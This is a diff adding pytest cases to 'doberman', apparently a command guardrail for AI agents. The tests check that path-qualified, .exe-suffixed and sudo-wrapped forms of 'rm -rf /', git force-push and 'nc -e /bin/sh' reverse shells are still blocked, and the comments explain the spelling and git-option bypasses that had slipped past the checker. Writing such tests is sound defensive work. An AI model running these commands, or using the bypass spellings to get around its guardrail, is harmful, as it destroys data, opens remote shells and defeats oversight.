@@ -13,6 +13,7 @@ from datetime import datetime, timezone
 import pytest
 
 from doberman import config
+from doberman.engine.objective import ObjectiveGuardrail
 from doberman.engine.rules import commands as commands_module
 from doberman.engine.rules.commands import (
     DestructiveCommandRule,
@@ -2019,3 +2020,119 @@ def test_substitution_nesting_is_depth_capped():
 
     shallow = "x=" + "$(" * 10 + "echo hi" + ")" * 10
     assert _cmd(shallow).verdict is Verdict.PASS
+
+
+# --- #690: path-qualified / .exe-suffixed / wrapped verb spellings must not --
+# bypass destructive-command detection. `_segment_verdict` compared `tokens[0]`
+# as an exact bare string, so `rm.exe`, `/bin/rm`, `RM.EXE`, or a
+# wrapper-stripped `sudo /bin/rm` never matched the `rm`/`git`/nc-like tables
+# even though they run the exact same binary as the bare spelling. The fix
+# canonicalises the verb (basename on `/` and `\`, case-insensitive
+# `.exe`/`.cmd`/`.bat`/`.com` suffix stripped) once at the top of
+# `_segment_verdict` and rebinds `tokens` itself, so every downstream check —
+# the git verb walk, the nc/ncat/socat exec-on-connect detector — sees the
+# canonical verb too, whether or not a wrapper (`sudo`, ...) ran first.
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "rm -rf /",
+        "rm.exe -rf /",
+        "RM.EXE -rf /",
+        "/bin/rm -rf /",
+        "sudo /bin/rm -rf /",
+        "sudo rm.exe -rf /",
+        "C:\\Windows\\System32\\rm.exe -rf /",
+    ],
+)
+def test_path_qualified_or_exe_suffixed_rm_still_blocks(command):
+    result = _cmd(command)
+    assert result.verdict is Verdict.BLOCK
+    assert ReasonCode.destructive_command in result.reason_codes
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "git push --force origin main",
+        "git.exe push --force origin main",
+        "/usr/bin/git push --force origin main",
+        "sudo git.exe push --force origin main",
+    ],
+)
+def test_path_qualified_or_exe_suffixed_git_force_push_still_blocks(command):
+    result = _cmd(command)
+    assert result.verdict is Verdict.BLOCK
+    assert ReasonCode.destructive_command in result.reason_codes
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "nc -e /bin/sh 10.0.0.1 4444",
+        "/usr/bin/nc -e /bin/sh 10.0.0.1 4444",
+        "nc.exe -e cmd.exe 10.0.0.1 4444",
+        "sudo /usr/bin/nc -e /bin/sh 10.0.0.1 4444",
+    ],
+)
+def test_path_qualified_or_exe_suffixed_nc_exec_still_blocks(command):
+    result = _cmd(command)
+    assert result.verdict is Verdict.BLOCK
+    assert ReasonCode.raw_socket_channel in result.reason_codes
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "rm -rf ./src",  # single in-repo delete under the bulk threshold, by design
+        "echo rm.exe",  # a mere argument, not the verb — never normalised
+    ],
+)
+def test_verb_canonicalisation_does_not_over_trigger(command):
+    assert _cmd(command).verdict is Verdict.PASS
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "rm.exe -rf /",
+        "git.exe push --force origin main",
+    ],
+)
+def test_path_qualified_verb_bypass_blocks_through_full_objective_guardrail(command):
+    # Full pipeline (proxy normalize -> ObjectiveGuardrail), not just the rule
+    # in isolation — the probe path #690 was actually verified on.
+    action = normalize("Bash", {"command": command})
+    ctx = EvalContext(metadata={"repo_root": ".", "raw_arguments": {"command": command}})
+    result = ObjectiveGuardrail().evaluate(action, ctx)
+    assert result.verdict is Verdict.BLOCK
+    assert ReasonCode.destructive_command in result.reason_codes
+
+
+# --- #690: `git --attr-source <tree-ish>` was missing from ------------------
+# `_GIT_GLOBAL_OPTIONS_WITH_VALUE` and desynced the verb walk exactly the way
+# `--git-dir <path>` used to (#550): `HEAD` in
+# `git --attr-source HEAD push --force ...` was read as the verb, so the real
+# force-push silently PASSed. The `=`-joined form (`--attr-source=HEAD`) was
+# already a single self-contained token and was never affected.
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "git --attr-source HEAD push --force origin main",
+        "git --attr-source=HEAD push --force origin main",
+    ],
+)
+def test_git_attr_source_global_option_still_locates_force_push_verb(command):
+    result = _cmd(command)
+    assert result.verdict is Verdict.BLOCK
+    assert ReasonCode.destructive_command in result.reason_codes
+
+
+def test_git_attr_source_global_option_still_locates_history_rewrite_verb():
+    bare = _cmd("git reset --hard HEAD~3")
+    with_global = _cmd("git --attr-source HEAD reset --hard HEAD~3")
+    assert with_global.verdict == bare.verdict == Verdict.AUTH
+    assert with_global.reason_codes == bare.reason_codes == [ReasonCode.destructive_command]
